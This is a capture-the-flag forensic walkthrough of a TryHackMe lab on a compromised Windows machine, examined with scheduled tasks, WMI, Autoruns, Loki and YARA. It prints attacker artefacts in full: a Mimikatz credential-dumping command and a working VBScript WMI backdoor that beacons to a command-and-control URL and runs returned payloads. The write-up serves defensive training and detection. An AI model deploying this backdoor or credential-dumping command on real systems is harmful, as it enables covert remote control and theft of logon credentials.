# Investigating Windows 2.0

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Medium
Tags: Windows
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
In the previous challenge you performed a brief analysis. Within this challenge, 
you will take a deeper dive into the attack.
```

Room link: [https://tryhackme.com/room/investigatingwindows2](https://tryhackme.com/room/investigatingwindows2)

## Solution

**Note**: In order to answer the questions in this challenge you should have completed the following rooms:

- [Core Windows Processes](http://tryhackme.com/jr/btwindowsinternals)
- [Sysinternals](http://tryhackme.com/jr/btsysinternalssg)
- [Yara](https://tryhackme.com/room/yara)

**Tips for LOKI**:

- When you run the Loki scan I suggest you save the output to a log file so you can reference it to answer the questions below.
- The scan may take a while to complete. Make sure the prompt is always moving. It's an indicator that the scan is still running. You can kill the scan after you see warnings for `ntds.dit` files.

---------------------------------------------------------------------------------------

### Connect to the machine with RDP

Connect to the machine using RDP.

The credentials of the machine are as follows:

- **Username**: `Administrator`
- **Password**: `letmein123!`

Your machine's IP is: `10.64.189.51`

If you're using **Remmina** to RDP, set the **Color Depth** to `RemoteFX (32 bpp)`.

**Note**: This machine does not respond to ping (ICMP) and may take a few minutes to boot up.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Investigating_Windows_2.0]
└─$ export TARGET_IP=10.64.189.51 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Investigating_Windows_2.0]
└─$ xfreerdp /v:$TARGET_IP /cert:ignore /u:Administrator /p:'letmein123!' /h:1024 /w:1500 +clipboard 
[11:07:04:903] [17524:17525] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[11:07:04:903] [17524:17525] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
<---snip--->
```

After connecting we open both an **elevated** command prompt (cmd.exe) window and an **elevated** PowerShell window.

### What registry key contains the same command that is executed within a scheduled task?

The question is referring to the `GameOver` task that we identified in the [previous challange](../Easy/Investigating_Windows.md):

```bat
C:\Users\Administrator> schtasks /Query /TN "GameOver" /V /FO LIST

Folder: \
HostName:                             EC2AMAZ-I8UHO76
TaskName:                             \GameOver
Next Run Time:                        1/11/2026 10:12:00 AM
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        1/11/2026 10:07:00 AM
Last Result:                          0
Author:                               EC2AMAZ-I8UHO76\Administrator
Task To Run:                          C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrator
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           4:47:00 PM
Start Date:                           3/2/2019
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        0 Hour(s), 5 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled
```

We can search in the registry with `reg query`

```bat
C:\Users\Administrator> reg.exe QUERY HKCU /s /f mim.exe

HKEY_CURRENT_USER\Environment
    UserInitMprLogonScript    REG_MULTI_SZ    C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt

End of search: 1 match(es) found.

C:\Users\Administrator>
```

**Note that** the Windows Defender antivirus will detect and remove this Mimikatz task after a while!

```powershell
PS C:\Users\Administrator> Get-MpThreatDetection


ActionSuccess                  : True
AdditionalActionsBitMask       : 0
AMProductVersion               : 4.18.25100.9008
CleaningActionID               : 2
CurrentThreatExecutionStatusID : 0
DetectionID                    : {07805B8A-011E-4870-B2FE-46779D831600}
DetectionSourceTypeID          : 2
DomainUser                     : NT AUTHORITY\NETWORK SERVICE
InitialDetectionTime           : 1/11/2026 12:44:11 PM
LastThreatStatusChangeTime     : 1/11/2026 12:44:24 PM
ProcessName                    : Unknown
RemediationTime                : 1/11/2026 12:44:24 PM
Resources                      : {file:_C:\Windows\System32\Tasks\GameOver, regkey:_HKLM\SOFTWARE\Microsoft\Windows
                                 NT\CurrentVersion\Schedule\TaskCache\Tasks\{AB8C99A4-9D73-4DC0-9587-F8D0E9442B25},
                                 regkey:_HKLM\SOFTWARE\Microsoft\Windows
                                 NT\CurrentVersion\Schedule\TaskCache\Tree\GameOver,
                                 taskscheduler:_C:\Windows\System32\Tasks\GameOver}
ThreatID                       : 2147741009
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 3
PSComputerName                 :
```

Answer: `HKCU\Environment\UserIntMprLogonScript`

### What analysis tool will immediately close if/when you attempt to launch it?

We can assume that the tool is one of the common Sysinternal tools in `C:\Users\Administrator\Desktop\Tools\SysinternalsSuite`.  
A tools like:

- Process Monitor (`procmon.exe` and `procmon64.exe`)
- Process Explorer (`procexp.exe` and `procexp64.exe`)
- AutoRuns (`Autoruns.exe` and `Autoruns64.exe`)

Start each tool to verify if it remains running or not.

Answer: `procexp64.exe`

### What is the full WQL Query associated with this script?

[WQL](https://en.wikipedia.org/wiki/WQL) is the [WMI](https://en.wikipedia.org/wiki/Windows_Management_Instrumentation) Query Language.

We launch **Autoruns** and check the `WMI` tab:

![AutoRuns WMI Tab](Images/AutoRuns_WMI_Tab.png)

There we find two entries, where one of the entries is named `KillProcss`.

Alternatively, we can get the answer with `Get-WMIObject`

```powershell
PS C:\Users\Administrator> Get-WMIObject -Namespace root\Subscription -Class __EventFilter


__GENUS          : 2
__CLASS          : __EventFilter
__SUPERCLASS     : __IndicationRelated
__DYNASTY        : __SystemClass
__RELPATH        : __EventFilter.Name="TimingIntervalTrigger"
__PROPERTY_COUNT : 6
__DERIVATION     : {__IndicationRelated, __SystemClass}
__SERVER         : EC2AMAZ-I8UHO76
__NAMESPACE      : ROOT\Subscription
__PATH           : \\EC2AMAZ-I8UHO76\ROOT\Subscription:__EventFilter.Name="TimingIntervalTrigger"
CreatorSID       : {1, 5, 0, 0...}
EventAccess      :
EventNamespace   : ROOT\cimv2
Name             : TimingIntervalTrigger
Query            : SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'
QueryLanguage    : WQL
PSComputerName   : EC2AMAZ-I8UHO76

__GENUS          : 2
__CLASS          : __EventFilter
__SUPERCLASS     : __IndicationRelated
__DYNASTY        : __SystemClass
__RELPATH        : __EventFilter.Name="ProcessStartTrigger"
__PROPERTY_COUNT : 6
__DERIVATION     : {__IndicationRelated, __SystemClass}
__SERVER         : EC2AMAZ-I8UHO76
__NAMESPACE      : ROOT\Subscription
__PATH           : \\EC2AMAZ-I8UHO76\ROOT\Subscription:__EventFilter.Name="ProcessStartTrigger"
CreatorSID       : {1, 5, 0, 0...}
EventAccess      :
EventNamespace   : ROOT\cimv2
Name             : ProcessStartTrigger
Query            : SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'procexp64.exe'
QueryLanguage    : WQL
PSComputerName   : EC2AMAZ-I8UHO76

__GENUS          : 2
__CLASS          : __EventFilter
__SUPERCLASS     : __IndicationRelated
__DYNASTY        : __SystemClass
__RELPATH        : __EventFilter.Name="SCM Event Log Filter"
__PROPERTY_COUNT : 6
__DERIVATION     : {__IndicationRelated, __SystemClass}
__SERVER         : EC2AMAZ-I8UHO76
__NAMESPACE      : ROOT\Subscription
__PATH           : \\EC2AMAZ-I8UHO76\ROOT\Subscription:__EventFilter.Name="SCM Event Log Filter"
CreatorSID       : {1, 2, 0, 0...}
EventAccess      :
EventNamespace   : root\cimv2
Name             : SCM Event Log Filter
Query            : select * from MSFT_SCMEventLogEvent
QueryLanguage    : WQL
PSComputerName   : EC2AMAZ-I8UHO76



PS C:\Users\Administrator>
```

Answer: `SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'procexp64.exe'`

### What is the script language?

See image above.

Double-clicking on the entry shows the script which, after formatting, looks like this:

```vbscript
Dim oLocation, oServices, oProcessList, oProcess

Set oLocation = CreateObject("WbemScripting.SWbemLocator")
Set oServices = oLocation.ConnectServer(, "root\cimv2")

Set oProcessList = oServices.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessID = " & TargetEvent.ProcessID)

For Each oProcess in oProcessList
    oProcess.Terminate()
Next
```

Answer: `VBScript`

### What is the name of the other script?

See image above.

Answer: `LaunchBeaconingBackdoor`

### What is the name of the software company visible within the script?

Double-clicking on the `LaunchBeaconingBackdoor` entry shows the following script (after beautifying at [https://www.xhcode.com/vbscriptformat/](https://www.xhcode.com/vbscriptformat/))

```vbscript
Option Explicit
On Error Resume Next

Dim oXMLHTTP, oReg, aC2URL, aCmdType, aClassName, aPropertyName, aPayload, aMachineGuid

Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
oReg.GetStringValue & H80000002, "SOFTWARE\Microsoft\Cryptography", "MachineGuid", aMachineGuid

aC2URL = "http://googleaccountsservices.com/index.html&ID=" & aMachineGuid

Sub StorePayloadInWMIRepo(classname, propertyname, payload)
    Dim oLocation, oServices, oDataObject
    
    Set oLocation = CreateObject("WbemScripting.SWbemLocator")
    Set oServices = oLocation.ConnectServer(, "root\cimv2")
    
    Set oDataObject = oServices.Get
    oDataObject.Path_.Class = classname
    oDataObject.Properties_.Add(propertyname, 8).Value = payload
    oDataObject.Put _
End Sub

Sub DeleteWMIClass(classname, propertyname)
    Dim oLocation, oServices, oDataObject
    
    Set oLocation = CreateObject("WbemScripting.SWbemLocator")
    Set oServices = oLocation.ConnectServer(, "root\cimv2")
    
    Set oDataObject = oServices.Get
    oDataObject.Path_.Class = classname
    oDataObject.Properties_.Add(propertyname, 8).Value = ""
    oDataObject.Delete_()
End Sub

Sub ExecCommand(command)
    Dim oLocation, oServices, oProcess, oStartup, oConfig, oResult, iProcessID
    
    Const HIDDEN_WINDOW = 12
    Set oLocation = CreateObject("WbemScripting.SWbemLocator")
    Set oServices = oLocation.ConnectServer(, "root\cimv2")
    Set oStartup = oServices.Get("Win32_ProcessStartup")
    Set oConfig = oStartup.SpawnInstance _
    oConfig.ShowWindow = HIDDEN_WINDOW
    Set oProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
    oResult = oProcess.Create(command, Null, oConfig, iProcessID)
End Sub

' Decodes a base-64 encoded string (BSTR type).
' 1999 - 2004 Antonin Foller, http://www.motobit.com
' 1.01 - solves problem with Access And 'Compare Database' (InStr)
Function Base64Decode(ByVal base64String)
    'rfc1521
    '1999 Antonin Foller, Motobit Software, http://Motobit.cz
    Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    Dim dataLength, sOut, groupBegin
    
    'remove white spaces, If any
    base64String = Replace(base64String, vbCrLf, "")
    base64String = Replace(base64String, vbTab, "")
    base64String = Replace(base64String, " ", "")
    
    'The source must consists from groups with Len of 4 chars
    dataLength = Len(base64String)
    If dataLength Mod 4 <> 0 Then
        Err.Raise 1, "Base64Decode", "Bad Base64 string."
        Exit Function
    End If
    
    
    ' Now decode each group:
    For groupBegin = 1 To dataLength Step 4
        Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
        ' Each data group encodes up To 3 actual bytes.
        numDataBytes = 3
        nGroup = 0
        
        For CharCounter = 0 To 3
            ' Convert each character into 6 bits of data, And add it To
            ' an integer For temporary storage.  If a character is a '=', there
            ' is one fewer data byte.  (There can only be a maximum of 2 '=' In
            ' the whole string.)
            
            thisChar = Mid(base64String, groupBegin + CharCounter, 1)
            
            If thisChar = "=" Then
                numDataBytes = numDataBytes - 1
                thisData = 0
            Else
                thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
            End If
            If thisData =  - 1 Then
                Err.Raise 2, "Base64Decode", "Bad character In Base64 string."
                Exit Function
            End If
            
            nGroup = 64 * nGroup + thisData
        Next
        
        'Hex splits the long To 6 groups with 4 bits
        nGroup = Hex(nGroup)
        
        'Add leading zeros
        nGroup = String(6 - Len(nGroup), "0") & nGroup
        
        'Convert the 3 byte hex integer (6 chars) To 3 characters
        pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
        Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
        Chr(CByte("&H" & Mid(nGroup, 5, 2)))
        
        'add numDataBytes characters To out string
        sOut = sOut & Left(pOut, numDataBytes)
    Next
    
    Base64Decode = sOut
End Function

Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")
oXMLHTTP.open "GET", aC2URL, False
oXMLHTTP.send()

If oXMLHTTP.Status = 200 Then
    aCmdType = oXMLHTTP.getResponseHeader("Type")
    aClassName = oXMLHTTP.getResponseHeader("Class")
    aPropertyName = oXMLHTTP.getResponseHeader("Property")
    aPayload = Base64Decode(oXMLHTTP.responseText)
    
    Select Case aCmdType
        Case "V"
        If Not IsNull(aPayload) Then
            Execute aPayload
        End If
        Case "P"
        If Not IsNull(aClassName) And Not IsNull(aPropertyName) And Not IsNull(aPayload) Then
            Call StorePayloadInWMIRepo(aClassName, aPropertyName, aPayload)
        End If
        Case "D"
        If Not IsNull(aClassName) And Not IsNull(aPropertyName) Then
            Call DeleteWMIClass(aClassName, aPropertyName)
        End If
        Case "C"
        If Not IsNull(aPayload) Then
            Call ExecCommand(aPayload)
        End If
    End Select
End If
```

The software company is visible on these lines:

```vbscript
<---snip--->
' Decodes a base-64 encoded string (BSTR type).
' 1999 - 2004 Antonin Foller, http://www.motobit.com
' 1.01 - solves problem with Access And 'Compare Database' (InStr)
Function Base64Decode(ByVal base64String)
    'rfc1521
    '1999 Antonin Foller, Motobit Software, http://Motobit.cz
    Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    Dim dataLength, sOut, groupBegin
<---snip--->
```

Answer: `Motobit Software`

### What 2 websites are associated with this software company? (answer, answer)

Hint: .com website goes first

See output above.

If you don't want to browse through the code manually, you can let CyberChef's `Extract URLs` recipe do the work:

![CyberChef Extract URLs](Images/CyberChef_Extract_URLs.png)

Answer: `http://www.motobit.com, http://motobit.cz`

### Search online for the name of the script from Q5 and one of the websites from the previous answer. What attack script comes up in your search?

Googling for `Motobit LaunchBeaconingBackdoor` gives you [WMIBackdoor.ps1](https://github.com/mattifestation/WMI_Backdoor/blob/master/WMIBackdoor.ps1).

Answer:  `WMIBackdoor.ps1`

### What is the location of this file within the local machine?

We can easily search for files with `where.exe`

```bat
C:\Users\Administrator> where /R C:\ WMIBackdoor.ps1
C:\TMP\WMIBackdoor.ps1

C:\Users\Administrator>
```

Answer:  `C:\TMP`

### Which 2 processes open and close very quickly every few minutes? (answer, answer)

Hint: Enter your answer in alphabetical order

We have already seen one of these tasks (`GameOver`) in question #1:

```bat
C:\Users\Administrator> schtasks /Query /TN "GameOver" /V /FO LIST

Folder: \
HostName:                             EC2AMAZ-I8UHO76
TaskName:                             \GameOver
Next Run Time:                        1/11/2026 10:12:00 AM
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        1/11/2026 10:07:00 AM
Last Result:                          0
Author:                               EC2AMAZ-I8UHO76\Administrator
Task To Run:                          C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrator
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           4:47:00 PM
Start Date:                           3/2/2019
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        0 Hour(s), 5 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled
```

The other task can be seen from the **Task Scheduler**:

![Repeating Processes Task Scheduler](Images/Repeating_Processes_Task_Scheduler.png)

```bat
C:\Users\Administrator> schtasks /Query /TN "falshupdate22" /V /FO LIST

Folder: \
HostName:                             EC2AMAZ-I8UHO76
TaskName:                             \falshupdate22
Next Run Time:                        1/11/2026 11:57:04 AM
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        1/11/2026 11:55:04 AM
Last Result:                          0
Author:                               Administrator
Task To Run:                          powershell.exe -WindowStyle Hidden -nop -c ""
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          Administrator
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           4:49:04 PM
Start Date:                           3/2/2019
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        0 Hour(s), 2 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled
```

Windows from both these scheduled tasks can be seen poping up regularly.

**Note that** the Windows Defender antivirus will detect and remove the Mimikatz task after a while!

```powershell
PS C:\Users\Administrator> Get-MpThreatDetection


ActionSuccess                  : True
AdditionalActionsBitMask       : 0
AMProductVersion               : 4.18.25100.9008
CleaningActionID               : 2
CurrentThreatExecutionStatusID : 0
DetectionID                    : {07805B8A-011E-4870-B2FE-46779D831600}
DetectionSourceTypeID          : 2
DomainUser                     : NT AUTHORITY\NETWORK SERVICE
InitialDetectionTime           : 1/11/2026 12:44:11 PM
LastThreatStatusChangeTime     : 1/11/2026 12:44:24 PM
ProcessName                    : Unknown
RemediationTime                : 1/11/2026 12:44:24 PM
Resources                      : {file:_C:\Windows\System32\Tasks\GameOver, regkey:_HKLM\SOFTWARE\Microsoft\Windows
                                 NT\CurrentVersion\Schedule\TaskCache\Tasks\{AB8C99A4-9D73-4DC0-9587-F8D0E9442B25},
                                 regkey:_HKLM\SOFTWARE\Microsoft\Windows
                                 NT\CurrentVersion\Schedule\TaskCache\Tree\GameOver,
                                 taskscheduler:_C:\Windows\System32\Tasks\GameOver}
ThreatID                       : 2147741009
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 3
PSComputerName                 :
```

Answer: `mim.exe, powershell.exe`

### What is the parent process for these 2 processes?

Hint: Figure out how to launch Process Explorer

[All scheduled tasks are spawned by svchost.exe](https://nasbench.medium.com/a-deep-dive-into-windows-scheduled-tasks-and-the-processes-running-them-218d1eed4cce) in never versions of Windows.

We can verify this by running **Process Monitor** and set a filter that only shows `Process Start` and `Process Exit`.

![Repeating Processes Process Monitor](Images/Repeating_Processes_Process_Monitor.png)

Answer: `svchost.exe`

### What is the first operation for the first of the 2 processes?

We more or less saw this in the image above but we can verify this with **Process Monitor** again running with a filter of `Process Name is mim.exe`

![Process Monitor mim.exe](Images/Process_Monitor_mim.exe.png)

![Process Monitor mim.exe 2](Images/Process_Monitor_mim.exe_2.png)

Answer: `Process Start`

### Inspect the properties for the 1st occurrence of this process. In the Event tab what are the 4 pieces of information displayed? (answer, answer, answer, answer)

Double-clicking on the `Process Start` line for `mim.exe` in **Process Monitor** we get the following window:

![Process Monitor mim.exe 3](Images/Process_Monitor_mim.exe_3.png)

Answer: `Parent PID, Command line, Current directory, Environment`

### Inspect the disk operations, what is the name of the unusual process?

Hint: Try Process Hacker

Start **Process Hacker** and select the `Disk` tab. Scroll down and note the `Name`column.

![Process Hacker No Process](Images/Process_Hacker_No_Process.png)

Answer: `No process`

### Run Loki. Inspect the output. What is the name of the module after `Init`?

We run `loki.exe -l loki_log.txt` from its folder

![Loki Execution](Images/Loki_Execution.png)

and check the log file

![Loki log 1](Images/Loki_log_1.png)

Answer: `WMIScan`

### Regarding the 2nd warning, what is the name of the eventFilter?

![Loki log 2](Images/Loki_log_2.png)

Answer: `ProcessStartTrigger`

### For the 4th warning, what is the class name?

![Loki log 3](Images/Loki_log_3.png)

Answer: `__FilterToConsumerBinding`

### What binary alert has the following 4d5a90000300000004000000ffff0000b8000000 as FIRST_BYTES?

![Loki log 4](Images/Loki_log_4.png)

Answer: `nbtscan.exe`

### According to the results, what is the description listed for reason 1?

Scroll to the right for the `nbtscan.exe` line to find the answer

![Loki log 5](Images/Loki_log_5.png)

Answer: `Known Bad / Dual use classics`

### Which binary alert is marked as APT Cloaked?

Search for `APT` in the log file

![Loki log 6](Images/Loki_log_6.png)

and scroll to the left of the line to the answer

![Loki log 7](Images/Loki_log_7.png)

Answer: `p.exe`

### What are the matches? (str1, str2)

Scroll to the end of the line to find the answer

![Loki log 8](Images/Loki_log_8.png)

Answer: `psexesvc.exe, Sysinternals PsExec`

### Which binary alert is associated with somethingwindows.dmp found in C:\TMP?

I found no matching alert, but there is a `warning` on the previous line.

![Loki log 9](Images/Loki_log_9.png)

The association is that the files are located in the same directory.

```powershell
PS C:\Users\Administrator> where.exe /R C:\ *.dmp
C:\TMP\somethingwindows.dmp
PS C:\Users\Administrator>
```

Answer: `schtasks-backdoor.ps1`

### Which binary is encrypted that is similar to a trojan?

Search for `Trojan` in the log file

![Loki log 10](Images/Loki_log_10.png)

and scroll to the left of the line to the answer

![Loki log 11](Images/Loki_log_11.png)

Answer: `xCmd.exe`

### There is a binary that can masquerade itself as a legitimate core Windows process/image. What is the full path of this binary?

A common binary/process to masquerade as is `svchost.exe` since their are multiple versions of the process running.

Searching for `svchost` and skipping the binaries that are located in the standard directory (`C:\Windows\System32`) gives us

![Loki log 12](Images/Loki_log_12.png)

Answer: `C:\Users\Public\svchost.exe`

### What is the full path location for the legitimate version?

See above and [Wikipedia](https://en.wikipedia.org/wiki/Svchost.exe).

Answer: `C:\Windows\System32`

### What is the description listed for reason 1?

Scroll to the right of the line to the answer

![Loki log 13](Images/Loki_log_13.png)

Answer: `Stuff running where it normally shouldn't`

### There is a file in the same folder location that is labeled as a hacktool. What is the name of the file?

Search for `C:\Users\Public` in the log file

![Loki log 14](Images/Loki_log_14.png)

and scroll to the right to verify that the description is a hacktool.

![Loki log 15](Images/Loki_log_15.png)

Answer: `en-US.js`

### What is the name of the Yara Rule MATCH?

See image above.

Answer: `CACTUSTORCH`

### Which binary didn't show in the Loki results?

We know since previously that Mimikatz (`mim.exe`) is on the machine, but the binary is not detected.

However, the Mimikatz log file is:

![Loki log 16](Images/Loki_log_16.png)

Answer: `mim.exe`

### Complete the yar rule file located within the Tools folder on the Desktop. What are 3 strings to complete the rule in order to detect the binary Loki didn't hit on? (answer, answer, answer)

The `test.yar` file located in `C:\Users\Administrator\Desktop\Tools\yara-v4.0.4-1544-win64` contains

```text
rule mimikatz
{
  strings:
    $s1 = "??.??1"
    $s2 = "??.?x?"
    $s3 = "v?.?.????7"
  condition:
    all of them
}

rule mimikatz_lsass_mdmp
{
  strings:
    $lsass = "System32\\lsass.exe" wide nocase
  condition:
    (uint32(0) == 0x504d444d) and $lsass
}
```

We search for the strings patterns as regular expressions to find the answers:

```powershell
PS C:\TMP> C:\Users\Administrator\Desktop\Tools\SysinternalsSuite\strings64.exe mim.exe | findstr "^..\...1$"
mk.ps1
mk.ps1
mk.ps1
PS C:\TMP> C:\Users\Administrator\Desktop\Tools\SysinternalsSuite\strings64.exe mim.exe | findstr "^..\..x.$"
mk.exe
mk.exe
mk.exe
PS C:\TMP> C:\Users\Administrator\Desktop\Tools\SysinternalsSuite\strings64.exe mim.exe | findstr "^v.\..\.....7$"
v2.0.50727
v2.0.50727
PS C:\TMP>
```

After updating the rule file:

```text
rule mimikatz
{
  strings:
    $s1 = "mk.ps1"
    $s2 = "mk.exe"
    $s3 = "v2.0.50727"
  condition:
    all of them
}

rule mimikatz_lsass_mdmp
{
  strings:
    $lsass = "System32\\lsass.exe" wide nocase
  condition:
    (uint32(0) == 0x504d444d) and $lsass
}
```

we can run **YARA** to verify that the detection works

```bat
C:\Users\Administrator\Desktop\Tools\yara-v4.0.4-1544-win64>yara64.exe test.yar C:\TMP
mimikatz C:\TMP\mim.exe
mimikatz_lsass_mdmp C:\TMP\somethingwindows.dmp

C:\Users\Administrator\Desktop\Tools\yara-v4.0.4-1544-win64>
```

Answer: `mk.ps1, mk.exe, v2.0.50727`

For additional information, please see the references below.

## References

- [A Deep Dive Into Windows Scheduled Tasks and The Processes Running Them](https://nasbench.medium.com/a-deep-dive-into-windows-scheduled-tasks-and-the-processes-running-them-218d1eed4cce)
- [Autoruns - Homepage](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
- [CyberChef - GitHub](https://github.com/gchq/CyberChef)
- [CyberChef - Homepage](https://gchq.github.io/CyberChef/)
- [findstr - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)
- [Get-WmiObject - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1)
- [Loki - GitHub](https://github.com/Neo23x0/Loki)
- [Loki-RS - GitHub](https://github.com/Neo23x0/Loki-RS)
- [Logon Script (Windows) - MITRE ATT&CK](https://attack.mitre.org/techniques/T1037/001/)
- [Mimikatz - Github](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz - MITRE ATT&CK](https://attack.mitre.org/software/S0002/)
- [Mimikatz - Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Process Explorer - Homepage](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer)
- [Process Monitor - Homepage](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Regular expression - Wikipedia](https://en.wikipedia.org/wiki/Regular_expression)
- [Remote Desktop Protocol - Wikipedia](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)
- [Scheduled Task - MITRE ATT&CK](https://attack.mitre.org/techniques/T1053/005/)
- [schtasks - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)
- [Strings - Homepage](https://learn.microsoft.com/en-us/sysinternals/downloads/strings)
- [svchost.exe - Wikipedia](https://en.wikipedia.org/wiki/Svchost.exe)
- [VBScript - Wikipedia](https://en.wikipedia.org/wiki/VBScript)
- [Windows Management Instrumentation - Wikipedia](https://en.wikipedia.org/wiki/Windows_Management_Instrumentation)
- [Windows Registry - Wikipedia](https://en.wikipedia.org/wiki/Windows_Registry)
- [WQL - Wikipedia](https://en.wikipedia.org/wiki/WQL)
- [xfreerdp - Linux manual page](https://linux.die.net/man/1/xfreerdp)
- [Yara - Documentation](https://yara.readthedocs.io/en/latest/)
- [Yara - GitHub](https://github.com/virustotal/yara)
- [Yara - Homepage](https://virustotal.github.io/yara/)
